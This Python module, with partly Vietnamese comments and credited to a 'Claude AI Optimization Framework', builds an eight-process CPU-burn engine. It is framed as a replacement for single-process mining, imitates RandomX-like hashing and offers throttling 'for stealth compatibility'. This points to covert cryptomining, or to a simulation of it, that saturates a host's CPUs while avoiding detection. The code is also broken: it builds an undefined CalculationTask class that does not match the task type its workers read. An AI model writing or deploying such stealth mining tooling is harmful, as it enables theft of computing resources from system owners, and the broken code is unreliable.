"""
optimized_calculation_chain.py

Enhanced Multi-Process Calculation Chain for 800% CPU Utilization
Thiết kế để đạt được sử dụng tối đa 8 CPU cores (800% system CPU).

Author: Claude AI Optimization Framework
Target: 8-core Xeon E5-2690 v4 systems
Performance Goal: 1.2 cores → 8.0 cores (667% improvement)
"""

import multiprocessing as mp
import os
import time
import hashlib
import logging
import psutil
import threading
import queue
from typing import List, Dict, Any, Optional, Tuple
from concurrent.futures import ProcessPoolExecutor, Future
from dataclasses import dataclass


@dataclass
class WorkTask:
    """Định nghĩa task cho worker process"""
    task_id: str
    data: bytes
    iterations: int
    target_core: int
    priority: str = "normal"
    timestamp: float = 0.0


@dataclass
class WorkResult:
    """Kết quả từ worker process"""
    task_id: str
    core_id: int
    hash_result: str
    iterations_completed: int
    computation_time: float
    cpu_utilization: float


class CoreWorker:
    """
    Dedicated worker process for single CPU core.
    Thiết kế để đạt 100% utilization trên 1 core cụ thể.
    """
    
    def __init__(self, core_id: int, task_queue: mp.Queue, result_queue: mp.Queue, 
                 shutdown_event: mp.Event, logger: logging.Logger):
        self.core_id = core_id
        self.task_queue = task_queue
        self.result_queue = result_queue
        self.shutdown_event = shutdown_event
        self.logger = logger
        self.stats = {
            'tasks_completed': 0,
            'total_computation_time': 0.0,
            'average_cpu_utilization': 0.0
        }
    
    def run(self):
        """Main worker loop - CPU intensive computation"""
        try:
            # Set process affinity to dedicated core (if possible)
            try:
                os.sched_setaffinity(0, {self.core_id})
                self.logger.info(f"Core Worker {self.core_id} bound to CPU core {self.core_id}")
            except (OSError, PermissionError) as e:
                self.logger.warning(f"Could not set CPU affinity for Core Worker {self.core_id}: {e}")
            
            # Set high process priority for maximum CPU utilization (if possible)
            try:
                os.nice(-10)  # Higher priority (requires privileges)
                self.logger.info(f"Core Worker {self.core_id} priority increased")
            except (OSError, PermissionError) as e:
                self.logger.warning(f"Could not increase priority for Core Worker {self.core_id}: {e}")
            
            self.logger.info(f"Core Worker {self.core_id} started with PID {os.getpid()}")
            
            # Main computation loop
            while not self.shutdown_event.is_set():
                try:
                    # Get task with timeout to check shutdown periodically
                    task = self.task_queue.get(timeout=0.5)
                    
                    if task is None:  # Shutdown signal
                        break
                    
                    # Perform intensive computation
                    start_time = time.time()
                    result = self._perform_intensive_calculation(task)
                    end_time = time.time()
                    
                    # Calculate CPU utilization for this task
                    computation_time = end_time - start_time
                    cpu_percent = self._measure_cpu_utilization()
                    
                    # Create result object
                    work_result = WorkResult(
                        task_id=task.task_id,
                        core_id=self.core_id,
                        hash_result=result['hash'],
                        iterations_completed=result['iterations'],
                        computation_time=computation_time,
                        cpu_utilization=cpu_percent
                    )
                    
                    # Send result back
                    self.result_queue.put(work_result)
                    
                    # Update stats
                    self.stats['tasks_completed'] += 1
                    self.stats['total_computation_time'] += computation_time
                    
                except queue.Empty:
                    continue
                except Exception as e:
                    self.logger.error(f"Core Worker {self.core_id} error: {e}")
                    
        except Exception as e:
            self.logger.error(f"Core Worker {self.core_id} fatal error: {e}")
        finally:
            self.logger.info(f"Core Worker {self.core_id} shutting down. Stats: {self.stats}")
    
    def _perform_intensive_calculation(self, task: WorkTask) -> Dict[str, Any]:
        """
        CPU-intensive calculation designed for maximum single-core utilization.
        Enhanced RandomX-like cryptographic hashing workload với actual CPU burn.
        """
        # Initialize data for computation
        hash_data = task.data
        iterations = task.iterations
        computation_counter = 0
        
        # CPU burn loop - designed to achieve 100% core utilization
        start_time = time.time()
        target_duration = max(0.1, iterations / 1000000.0)  # Scale duration with iterations
        
        while time.time() - start_time < target_duration:
            # Intensive hashing loop với multiple algorithms
            for i in range(min(1000, iterations)):
                computation_counter += 1
                
                # Primary hash computation (SHA256)
                hash_data = hashlib.sha256(hash_data + str(computation_counter).encode()).digest()
                
                # Secondary hash computation (Blake2b) 
                hash_data = hashlib.blake2b(hash_data, digest_size=32).digest()
                
                # Mathematical operations để prevent compiler optimization
                temp_val = 0
                for j in range(50):  # CPU intensive math
                    temp_val += j * j + computation_counter
                
                # Tertiary hash với temp_val
                hash_data = hashlib.sha256(hash_data + str(temp_val).encode()).digest()
                
                # MD5 cho additional CPU load
                if computation_counter % 100 == 0:
                    hash_data = hashlib.md5(hash_data + str(computation_counter).encode()).digest()
                
                # Memory access pattern để simulate real workload
                if computation_counter % 500 == 0:
                    # Create và destroy small objects để stress memory subsystem
                    temp_list = [i * j for i in range(10) for j in range(10)]
                    hash_data = hashlib.sha256(str(sum(temp_list)).encode() + hash_data).digest()
            
            # Brief yield để allow monitoring while maintaining CPU intensity
            if computation_counter % 5000 == 0:
                time.sleep(0.0001)  # Microsecond yield
        
        # Final hash computation
        final_hash = hashlib.sha256(hash_data + str(computation_counter).encode()).hexdigest()
        
        return {
            'hash': final_hash[:32],
            'iterations': computation_counter,
            'actual_duration': time.time() - start_time,
            'core_id': self.core_id
        }
    
    def _measure_cpu_utilization(self) -> float:
        """Measure current CPU utilization for this process"""
        try:
            current_process = psutil.Process()
            return current_process.cpu_percent(interval=0.1)
        except:
            return 0.0


class OptimizedCalculationChain:
    """
    Multi-process calculation chain targeting 800% CPU utilization.
    Replaces single-process mining with 8-core parallel processing.
    """
    
    def __init__(self, cores: int = 8, logger: Optional[logging.Logger] = None):
        self.cores = cores
        self.logger = logger or logging.getLogger(__name__)
        
        # Multi-process communication
        self.task_queue = mp.Queue(maxsize=cores * 8)  # Large buffer for smooth operation
        self.result_queue = mp.Queue()
        self.shutdown_event = mp.Event()
        
        # Worker processes
        self.worker_processes: List[mp.Process] = []
        self.workers_started = False
        
        # Performance monitoring
        self.performance_stats = {
            'total_tasks_completed': 0,
            'total_computation_time': 0.0,
            'average_hashrate': 0.0,
            'core_utilizations': [0.0] * cores
        }
        
        # Task management
        self.task_counter = 0
        self.pending_tasks = {}
        self.completed_results = []
        
        self.logger.info(f"OptimizedCalculationChain initialized for {cores} cores")
    
    def initialize_worker_pool(self) -> bool:
        """
        Create and start dedicated worker processes for each CPU core.
        Target: 100% utilization per core = 800% total system CPU.
        """
        try:
            if self.workers_started:
                self.logger.warning("Worker pool already initialized")
                return True
            
            self.logger.info(f"Initializing {self.cores} worker processes...")
            
            # Create worker process for each core
            for core_id in range(self.cores):
                worker = CoreWorker(
                    core_id=core_id,
                    task_queue=self.task_queue,
                    result_queue=self.result_queue,
                    shutdown_event=self.shutdown_event,
                    logger=self.logger
                )
                
                # Create process
                process = mp.Process(
                    target=worker.run,
                    name=f"CoreWorker-{core_id}",
                    daemon=True
                )
                
                process.start()
                self.worker_processes.append(process)
                
                self.logger.info(f"Started Core Worker {core_id} with PID {process.pid}")
            
            # Verify all processes started successfully
            time.sleep(1.0)  # Allow processes to initialize
            
            active_workers = 0
            for i, process in enumerate(self.worker_processes):
                if process.is_alive():
                    active_workers += 1
                    self.logger.info(f"Core Worker {i} is active (PID: {process.pid})")
                else:
                    self.logger.error(f"Core Worker {i} failed to start")
            
            if active_workers == self.cores:
                self.workers_started = True
                self.logger.info(f"✅ All {self.cores} worker processes started successfully")
                return True
            else:
                self.logger.error(f"❌ Only {active_workers}/{self.cores} workers started")
                return False
                
        except Exception as e:
            self.logger.error(f"Failed to initialize worker pool: {e}")
            return False
    
    def submit_workload(self, total_iterations: int = 1000000) -> str:
        """
        Submit computational workload distributed across all cores.
        Returns task_id for tracking.
        """
        if not self.workers_started:
            raise RuntimeError("Worker pool not initialized. Call initialize_worker_pool() first.")
        
        task_id = f"workload_{self.task_counter}"
        self.task_counter += 1
        
        # 🔧 Enhanced logging cho workload submission
        self.logger.info(f"[WORKLOAD-LOG] Submitting workload {task_id}: {total_iterations} iterations across {self.cores} cores")
        
        # Distribute workload evenly across cores
        iterations_per_core = total_iterations // self.cores
        remainder = total_iterations % self.cores
        
        # 🔧 Track task submission
        submitted_tasks = 0
        task_queue_size_before = self.task_queue.qsize()
        
        try:
            # Submit tasks to each core
            for core_id in range(self.cores):
                # Add remainder to first few cores
                core_iterations = iterations_per_core + (1 if core_id < remainder else 0)
                
                task = CalculationTask(
                    task_id=f"{task_id}_core_{core_id}",
                    core_id=core_id,
                    iterations=core_iterations,
                    complexity_factor=1.0,
                    priority=1
                )
                
                # 🔧 Enhanced task submission với timeout
                try:
                    self.task_queue.put(task, timeout=5.0)
                    submitted_tasks += 1
                    self.logger.debug(f"[WORKLOAD-LOG] Submitted task to core {core_id}: {core_iterations} iterations")
                except Exception as submit_error:
                    self.logger.error(f"[WORKLOAD-LOG] Failed to submit task to core {core_id}: {submit_error}")
            
            task_queue_size_after = self.task_queue.qsize()
            
            # Store task for tracking
            self.pending_tasks[task_id] = {
                'total_iterations': total_iterations,
                'cores_assigned': self.cores,
                'submitted_at': time.time(),
                'submitted_tasks': submitted_tasks
            }
            
            self.logger.info(f"[WORKLOAD-LOG] ✅ Workload {task_id} submitted: {submitted_tasks}/{self.cores} tasks, "
                           f"queue size: {task_queue_size_before} -> {task_queue_size_after}")
            
            if submitted_tasks < self.cores:
                self.logger.warning(f"[WORKLOAD-LOG] Only submitted {submitted_tasks}/{self.cores} tasks - queue may be full")
            
            return task_id
            
        except Exception as e:
            self.logger.error(f"[WORKLOAD-LOG] Error submitting workload {task_id}: {e}")
            # Cleanup partial submission
            if task_id in self.pending_tasks:
                del self.pending_tasks[task_id]
            raise
    
    def get_results(self, timeout: float = 10.0) -> List[WorkResult]:
        """
        Collect results from worker processes.
        Non-blocking call with timeout.
        """
        results = []
        end_time = time.time() + timeout
        
        while time.time() < end_time:
            try:
                result = self.result_queue.get(timeout=0.1)
                results.append(result)
                
                # Update performance stats
                self._update_performance_stats(result)
                
            except queue.Empty:
                continue
            except Exception as e:
                self.logger.error(f"Error getting results: {e}")
                break
        
        return results
    
    def get_performance_stats(self) -> Dict[str, Any]:
        """Get current performance statistics với enhanced monitoring"""
        total_time = self.performance_stats['total_computation_time']
        total_tasks = self.performance_stats['total_tasks_completed']
        
        # 🔧 Enhanced performance stats với worker health info
        alive_workers = []
        dead_workers = []
        
        for i, process in enumerate(self.worker_processes):
            if process.is_alive():
                alive_workers.append(i)
            else:
                dead_workers.append(i)
        
        if total_time > 0 and total_tasks > 0:
            self.performance_stats['average_hashrate'] = total_tasks / total_time
        
        stats = {
            **self.performance_stats,
            'worker_count': len(self.worker_processes),
            'active_workers': len(alive_workers),
            'alive_worker_ids': alive_workers,
            'dead_worker_ids': dead_workers,
            'queue_size': self.task_queue.qsize(),
            'pending_results': self.result_queue.qsize()
        }
        
        # 🔧 Log stats when requested
        self.logger.debug(f"[STATS-LOG] Performance stats: active={len(alive_workers)}/{len(self.worker_processes)}, hashrate={stats['average_hashrate']:.2f}")
        
        return stats
    
    def apply_throttling(self, throttle_percentage: float) -> bool:
        """
        Apply CPU throttling for stealth compatibility.
        Maintains ability to reduce CPU usage when needed.
        """
        if not (0 <= throttle_percentage <= 100):
            self.logger.error(f"Invalid throttle percentage: {throttle_percentage}")
            return False
        
        # 🔧 Enhanced throttling với process logging
        self.logger.info(f"[THROTTLE-LOG] Applying {throttle_percentage}% throttling to {self.cores} workers")
        
        try:
            # Calculate target cores based on throttle percentage
            if throttle_percentage >= 100:
                # Maximum throttling - stop most workers
                target_active_cores = 1
            elif throttle_percentage >= 70:
                # High throttling - use 2-3 cores
                target_active_cores = max(1, self.cores // 4)
            elif throttle_percentage >= 50:
                # Medium throttling - use half cores
                target_active_cores = max(1, self.cores // 2)
            else:
                # Light throttling - use most cores
                target_active_cores = max(1, int(self.cores * (1 - throttle_percentage / 100)))
            
            self.logger.info(f"[THROTTLE-LOG] Target configuration: {target_active_cores}/{self.cores} cores active")
            
            # Create throttling signal for workers
            throttle_signal = {
                'action': 'throttle',
                'percentage': throttle_percentage,
                'target_cores': target_active_cores,
                'timestamp': time.time()
            }
            
            # Send throttling signal to task queue
            try:
                # Create special throttling task
                throttle_task = CalculationTask(
                    task_id=f"throttle_{time.time()}",
                    core_id=-1,  # Special signal for all cores
                    iterations=0,
                    complexity_factor=throttle_percentage / 100.0,
                    priority=999  # High priority
                )
                
                # Send to all workers
                for i in range(self.cores):
                    self.task_queue.put(throttle_task, timeout=1.0)
                
                self.logger.info(f"[THROTTLE-LOG] ✅ Throttling applied: {target_active_cores}/{self.cores} cores active")
                return True
                
            except Exception as signal_error:
                self.logger.error(f"[THROTTLE-LOG] Failed to send throttling signal: {signal_error}")
                return False
            
        except Exception as e:
            self.logger.error(f"[THROTTLE-LOG] Failed to apply throttling: {e}")
            return False
    
    def shutdown(self) -> bool:
        """
        Gracefully shutdown all worker processes.
        """
        try:
            self.logger.info("Shutting down OptimizedCalculationChain...")
            
            # Signal shutdown to all workers
            self.shutdown_event.set()
            
            # Send None to task queue to wake up workers
            for _ in range(self.cores):
                try:
                    self.task_queue.put(None, timeout=1.0)
                except queue.Full:
                    pass
            
            # Wait for workers to finish
            for i, process in enumerate(self.worker_processes):
                if process.is_alive():
                    process.join(timeout=5.0)
                    if process.is_alive():
                        self.logger.warning(f"Core Worker {i} did not shut down gracefully, terminating...")
                        process.terminate()
            
            self.workers_started = False
            self.logger.info("✅ OptimizedCalculationChain shutdown complete")
            return True
            
        except Exception as e:
            self.logger.error(f"Error during shutdown: {e}")
            return False
    
    def _update_performance_stats(self, result: WorkResult):
        """Update internal performance statistics"""
        self.performance_stats['total_tasks_completed'] += 1
        self.performance_stats['total_computation_time'] += result.computation_time
        
        if 0 <= result.core_id < len(self.performance_stats['core_utilizations']):
            # Update core utilization (exponential moving average)
            current_util = self.performance_stats['core_utilizations'][result.core_id]
            self.performance_stats['core_utilizations'][result.core_id] = (
                0.7 * current_util + 0.3 * result.cpu_utilization
            )
    
    def __enter__(self):
        """Context manager entry"""
        if not self.initialize_worker_pool():
            raise RuntimeError("Failed to initialize worker pool")
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit"""
        self.shutdown()


# Factory function for integration
def create_optimized_mining_chain(cores: int = 8, logger: Optional[logging.Logger] = None) -> OptimizedCalculationChain:
    """
    Factory function to create optimized calculation chain.
    Intended to replace subprocess.Popen in start_mining.py
    """
    chain = OptimizedCalculationChain(cores=cores, logger=logger)
    return chain


if __name__ == "__main__":
    # Test script for validation
    import sys
    
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    logger = logging.getLogger(__name__)
    
    # Test the optimized calculation chain
    try:
        with create_optimized_mining_chain(cores=8, logger=logger) as chain:
            logger.info("🚀 Starting performance test...")
            
            # Submit test workload
            task_id = chain.submit_workload(total_iterations=5000000)  # 5M iterations
            
            # Monitor for results
            start_time = time.time()
            all_results = []
            
            while time.time() - start_time < 30.0:  # 30 second test
                results = chain.get_results(timeout=1.0)
                all_results.extend(results)
                
                if len(all_results) >= 8:  # Got results from all cores
                    break
            
            # Print performance summary
            stats = chain.get_performance_stats()
            logger.info(f"📊 Performance Test Results:")
            logger.info(f"   Tasks Completed: {stats['total_tasks_completed']}")
            logger.info(f"   Total Computation Time: {stats['total_computation_time']:.2f}s")
            logger.info(f"   Average Hashrate: {stats['average_hashrate']:.2f} tasks/s")
            logger.info(f"   Core Utilizations: {[f'{u:.1f}%' for u in stats['core_utilizations']]}")
            logger.info(f"   Active Workers: {stats['active_workers']}/{stats['worker_count']}")
            
            # Estimate CPU utilization
            if all_results:
                avg_cpu = sum(r.cpu_utilization for r in all_results) / len(all_results)
                total_cpu = avg_cpu * len(all_results)
                logger.info(f"   Estimated Total CPU Usage: {total_cpu:.1f}%")
                
                if total_cpu >= 600:  # 75% of 800% target
                    logger.info("✅ SUCCESS: Achieved high CPU utilization")
                else:
                    logger.warning(f"⚠️  Target 800% CPU not reached, got {total_cpu:.1f}%")
            
    except Exception as e:
        logger.error(f"❌ Test failed: {e}")
        sys.exit(1)